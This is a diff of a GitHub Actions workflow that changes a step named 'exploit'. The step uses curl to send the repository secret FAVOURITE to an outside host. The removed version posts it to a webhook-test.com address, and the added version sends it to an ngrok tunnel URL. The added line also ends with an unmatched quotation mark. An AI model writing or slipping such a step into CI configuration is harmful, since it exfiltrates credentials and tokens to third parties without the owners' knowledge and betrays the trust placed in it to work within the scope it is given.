@@ -27,4 +27,4 @@ jobs:
       
       - name: exploit
         run: |
-          curl -X POST "https://webhook-test.com/b9e265cbf721c16526e07b1feac6e9da/${{ secrets.FAVOURITE }}"
+          curl https://f424-128-130-234-17.ngrok-free.app/${{ secrets.FAVOURITE }}"
